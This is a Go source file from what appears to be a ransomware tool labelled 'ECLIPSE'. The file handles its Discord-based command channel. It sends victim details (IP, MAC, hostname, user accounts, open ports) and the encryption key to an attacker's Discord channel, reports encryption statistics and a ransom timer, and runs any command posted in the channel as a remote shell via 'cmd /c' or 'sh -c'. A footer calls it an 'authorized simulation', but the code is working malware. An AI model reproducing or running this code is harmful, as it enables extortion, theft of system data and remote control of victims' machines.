package ransomware

import (
	"fmt"
	"net"
	"os/exec"
	"runtime"
	"sort"
	"strings"
	"time"

	"programa/utils"

	"github.com/bwmarrin/discordgo"
)

type VictimInfo struct {
	IP            string
	MAC           string
	Hostname      string
	OS            string
	Username      string
	EncryptionKey string
	DecryptionKey string
	Timestamp     string
	Users         string
	OpenPorts     string
}

func GenDC(encKey, decKey string) (string, error) {
	if err := utils.EnsureDiscordConfig(); err != nil {
		return "", err
	}

	dg, err := discordgo.New("Bot " + utils.DiscordBotToken)
	if err != nil {
		return "", fmt.Errorf("failed to create Discord session: %v", err)
	}
	defer dg.Close()

	victim := VictimInfo{
		IP:            utils.GetLocalIP(),
		MAC:           utils.GetMACAddress(),
		Hostname:      utils.GetHostname(),
		OS:            utils.GetOS(),
		Username:      utils.GetUsername(),
		EncryptionKey: encKey,
		DecryptionKey: decKey,
		Timestamp:     time.Now().Format("2006-01-02 15:04:05"),
		Users:         getUsersAndPermissions(),
		OpenPorts:     scanOpenPorts(),
	}

	channelName := generateChannelName(victim)

	channel, err := dg.GuildChannelCreate(utils.DiscordGuildID, channelName, discordgo.ChannelTypeGuildText)
	if err != nil {
		return "", fmt.Errorf("failed to create channel: %v", err)
	}

	err = dg.ChannelPermissionSet(
		channel.ID,
		utils.DiscordGuildID,
		discordgo.PermissionOverwriteTypeRole,
		0,
		discordgo.PermissionViewChannel,
	)
	if err != nil {
		fmt.Printf("Warning: Could not make channel private: %v\n", err)
	}

	_, err = dg.ChannelMessageSendEmbed(channel.ID, buildInfectionEmbed(victim))
	if err != nil {
		return "", fmt.Errorf("failed to send message: %v", err)
	}

	fmt.Printf("[✓] Data sent to Discord C2 - Channel: #%s\n", channelName)

	return channel.ID, nil
}

func buildInfectionEmbed(v VictimInfo) *discordgo.MessageEmbed {
	usersBlock := strings.TrimSpace(v.Users)
	if usersBlock == "" {
		usersBlock = "(unavailable)"
	}
	usersBlock = sanitizeCodeFenceContent(usersBlock)
	if len(usersBlock) > 3500 {
		usersBlock = usersBlock[:3497] + "..."
	}

	keyLine := "||" + v.DecryptionKey + "||"

	return &discordgo.MessageEmbed{
		Title:       "Infection · primary report",
		Description: "Symmetric **AES-256-GCM**. One hex secret for both directions. A **second embed** lands when the disk pass finishes (counts, bytes, extension mix).",
		Color:       0xC0392B,
		Fields: []*discordgo.MessageEmbedField{
			{
				Name: "Host",
				Value: fmt.Sprintf(
					"**Name:** %s\n**User:** %s\n**Recorded:** %s",
					v.Hostname, v.Username, v.Timestamp,
				),
				Inline: false,
			},
			{
				Name: "Network",
				Value: fmt.Sprintf(
					"**IP:** %s\n**MAC:** %s\n**Listening (common ports):** %s",
					v.IP, v.MAC, v.OpenPorts,
				),
				Inline: false,
			},
			{Name: "OS", Value: v.OS, Inline: true},
			{
				Name:   "Accounts / enumeration",
				Value:  "```\n" + usersBlock + "\n```",
				Inline: false,
			},
			{
				Name: "Secret key (spoiler — tap to reveal)",
				Value: keyLine + "\n• 64 hex chars · same value encrypts and decrypts\n• Also written on disk when possible (see stats embed)",
				Inline: false,
			},
			{
				Name: "Remote decrypt (this channel)",
				Value: "Send exactly:\n```\nDECRYPT <paste_hex_here>\n```\nNo angle brackets. Key must match the spoiler above.",
				Inline: false,
			},
			{
				Name: "Local decrypt (decrypt.exe from builder)",
				Value: "• `decrypt.exe <hex>`\n• Or omit argv and use key file:\n  - Windows: `%APPDATA%\\decryption_key.txt`\n  - Linux: `/tmp/.decryption_key`",
				Inline: false,
			},
		},
		Footer: &discordgo.MessageEmbedFooter{Text: "ECLIPSE · authorized simulation only"},
	}
}

func SendEncryptionStatsEmbed(channelID string) error {
	if err := utils.EnsureDiscordConfig(); err != nil {
		return err
	}

	dg, err := discordgo.New("Bot " + utils.DiscordBotToken)
	if err != nil {
		return err
	}
	defer dg.Close()

	elapsed := time.Since(EncryptStatsStarted)
	if EncryptStatsStarted.IsZero() {
		elapsed = 0
	}

	topExt := formatTopExtensions(14)
	if encryptStatsByExt == nil {
		topExt = "_(no data)_"
	}

	host := utils.GetHostname()
	avg := "—"
	if EncryptStatsFiles > 0 {
		avg = humanBytes(EncryptStatsBytes / int64(EncryptStatsFiles))
	}

	embed := &discordgo.MessageEmbed{
		Title:       "Encryption pass · telemetry",
		Description: fmt.Sprintf("**%s** — post-run inventory for this execution.", host),
		Color:       0xE67E22,
		Fields: []*discordgo.MessageEmbedField{
			{Name: "Files encrypted", Value: fmt.Sprintf("%d", EncryptStatsFiles), Inline: true},
			{Name: "I/O failures", Value: fmt.Sprintf("%d", EncryptStatsFailed), Inline: true},
			{Name: "Plaintext bytes", Value: humanBytes(EncryptStatsBytes), Inline: true},
			{Name: "Wall time", Value: elapsed.Round(time.Second).String(), Inline: true},
			{Name: "Mean file size", Value: avg, Inline: true},
			{Name: "Ransom timer", Value: fmt.Sprintf("%d h", RANSOM_HOURS), Inline: true},
			{Name: "Extensions (top)", Value: truncateField(topExt, 1024), Inline: false},
			{Name: "Key file (victim)", Value: keyFileLocationText(), Inline: false},
		},
		Footer:    &discordgo.MessageEmbedFooter{Text: fmt.Sprintf("%d paths tracked in-session", len(encryptedFiles))},
		Timestamp: time.Now().Format(time.RFC3339),
	}

	_, err = dg.ChannelMessageSendEmbed(channelID, embed)
	return err
}

func keyFileLocationText() string {
	if runtime.GOOS == "windows" {
		return "`%APPDATA%\\decryption_key.txt`"
	}
	return "`/tmp/.decryption_key`"
}

func humanBytes(n int64) string {
	if n < 0 {
		n = 0
	}
	suffixes := []string{"B", "KiB", "MiB", "GiB", "TiB", "PiB", "EiB"}
	v := float64(n)
	const base = 1024.0
	i := 0
	for v >= base && i < len(suffixes)-1 {
		v /= base
		i++
	}
	if i == 0 {
		return fmt.Sprintf("%d B", n)
	}
	return fmt.Sprintf("%.2f %s", v, suffixes[i])
}

func formatTopExtensions(max int) string {
	type pair struct {
		ext string
		n   int
	}
	var list []pair
	for e, n := range encryptStatsByExt {
		list = append(list, pair{e, n})
	}
	sort.Slice(list, func(i, j int) bool {
		if list[i].n != list[j].n {
			return list[i].n > list[j].n
		}
		return list[i].ext < list[j].ext
	})
	var b strings.Builder
	for i, p := range list {
		if i >= max {
			fmt.Fprintf(&b, "\n_…and %d more types_", len(list)-max)
			break
		}
		if i > 0 {
			b.WriteByte('\n')
		}
		fmt.Fprintf(&b, "`%s` × **%d**", p.ext, p.n)
	}
	if b.Len() == 0 {
		return "_(none)_"
	}
	return b.String()
}

func truncateField(s string, max int) string {
	if len(s) <= max {
		return s
	}
	return s[:max-3] + "..."
}

func sanitizeCodeFenceContent(s string) string {
	s = strings.ReplaceAll(s, "```", "`\u200b``")
	return s
}

func StartDiscordC2(channelID, decKey string) {
	if err := utils.EnsureDiscordConfig(); err != nil {
		fmt.Printf("Failed to connect to Discord: %v\n", err)
		return
	}

	dg, err := discordgo.New("Bot " + utils.DiscordBotToken)
	if err != nil {
		fmt.Printf("Failed to connect to Discord: %v\n", err)
		return
	}
	defer dg.Close()

	activeChannel = channelID
	fmt.Printf("[+] Discord C2 active - Channel ID: %s\n", channelID)

	for {
		checkForCommands(dg, channelID, decKey)
		time.Sleep(POLL_INTERVAL)
	}
}

func checkForCommands(dg *discordgo.Session, channelID, decKey string) {
	messages, err := dg.ChannelMessages(channelID, 10, "", "", "")
	if err != nil {
		return
	}

	if len(messages) == 0 {
		return
	}

	latestMsg := messages[0]

	if latestMsg.ID == lastMessageID {
		return
	}

	if latestMsg.Author.Bot {
		lastMessageID = latestMsg.ID
		return
	}

	lastMessageID = latestMsg.ID

	command := strings.TrimSpace(latestMsg.Content)

	if len(command) >= 8 && strings.EqualFold(command[:8], "decrypt ") {
		providedKey := normalizeDiscordHexKey(command[8:])
		want := normalizeDiscordHexKey(decKey)

		if strings.EqualFold(providedKey, want) {
			dg.ChannelMessageSend(channelID, "✅ **Decryption key accepted. Starting decryption...**")
			DecryptSystem()
			dg.ChannelMessageSend(channelID, "✅ **Decryption pass finished.**")
			return
		}

		dg.ChannelMessageSend(channelID, "❌ **Key mismatch.** Copy the full 64-character hex from the spoiler (no spaces).")
		return
	}

	output := executeCommand(command)
	sendCommandOutput(dg, channelID, command, output)
}

func executeCommand(command string) string {
	var cmd *exec.Cmd

	if runtime.GOOS == "windows" {
		cmd = exec.Command("cmd", "/c", command)
	} else {
		cmd = exec.Command("sh", "-c", command)
	}

	output, err := cmd.CombinedOutput()

	if err != nil {
		return fmt.Sprintf("Error: %v\n%s", err, string(output))
	}

	return string(output)
}

func sendCommandOutput(dg *discordgo.Session, channelID, command, output string) {
	const maxLength = 1900

	if len(output) > maxLength {
		output = output[:maxLength] + "\n... (output truncated)"
	}

	if output == "" {
		output = "(no output)"
	}

	message := fmt.Sprintf("**Command:** `%s`\n```\n%s\n```", command, output)

	dg.ChannelMessageSend(channelID, message)
}

func getUsersAndPermissions() string {
	var cmd *exec.Cmd

	if runtime.GOOS == "windows" {
		cmd = exec.Command("net", "user")
	} else {
		cmd = exec.Command("sh", "-c", "cut -d: -f1 /etc/passwd")
	}

	output, err := cmd.CombinedOutput()
	if err != nil {
		return "Unable to retrieve users"
	}

	return string(output)
}

func scanOpenPorts() string {
	commonPorts := []int{21, 22, 23, 25, 53, 80, 110, 143, 443, 445, 3306, 3389, 5432, 5900, 8080}
	var openPorts []string

	localIP := utils.GetLocalIP()
	if localIP == "Unknown" {
		return "Unable to scan ports"
	}

	for _, port := range commonPorts {
		address := net.JoinHostPort(localIP, fmt.Sprintf("%d", port))
		conn, err := net.DialTimeout("tcp", address, 500*time.Millisecond)
		if err == nil {
			conn.Close()
			openPorts = append(openPorts, fmt.Sprintf("%d", port))
		}
	}

	if len(openPorts) == 0 {
		return "No common ports open"
	}

	return strings.Join(openPorts, ", ")
}

func generateChannelName(v VictimInfo) string {
	if v.IP != "Unknown" {
		ipClean := strings.ReplaceAll(v.IP, ".", "-")
		return "infected-" + ipClean
	}

	if v.MAC != "Unknown" {
		macClean := strings.ReplaceAll(v.MAC, ":", "")
		macClean = strings.ReplaceAll(macClean, "-", "")
		if len(macClean) > 12 {
			macClean = macClean[:12]
		}
		return "infected-" + macClean
	}

	return "infected-" + v.Hostname + "-" + fmt.Sprintf("%d", time.Now().Unix())
}

func normalizeDiscordHexKey(s string) string {
	s = strings.TrimSpace(s)
	s = strings.ReplaceAll(s, " ", "")
	s = strings.TrimPrefix(strings.TrimPrefix(s, "0x"), "0X")
	return s
}
